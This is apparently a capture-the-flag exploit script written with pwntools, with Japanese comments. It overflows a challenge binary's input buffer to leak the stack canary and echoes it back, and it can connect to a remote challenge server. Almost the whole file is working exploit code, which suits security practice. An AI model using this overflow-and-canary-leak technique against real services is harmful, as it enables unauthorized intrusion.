#!/usr/bin/env python3

from pwn import *

exe = ELF("./chall_patched")

context.log_level = 'debug'
context.binary = exe
context.terminal = ['tmux', 'splitw', '-h']
host = '34.170.146.252'
port = 37891

gdbscript = '''
b *vuln+167
c
'''


def conn():
    match args.TYPE:
        case 'REMOTE':
            r = remote(host, port)
        case 'DBG':
            r = gdb.debug([exe.path], gdbscript)
        case _:
            r = process([exe.path])

    return r


def main():
    r = conn()
    r.sendlineafter(b"Input:", b"a" * 200) #最後に改行も送る
    r.recvuntil(b'a'*200 + b'\x0a') #先に読み取るがこれは変数に保存していないからごみ
    #leaked = r.recvline().strip() #末尾がくるまで受け取って最後の末尾を消している
    leaked = r.recv(7) + b"\00"

    print(f'canary: {(leaked)}')

    r.sendlineafter(b"Canary?", leaked) #改行を追加せずに送る。

    r.interactive()


if __name__ == "__main__":
    main()
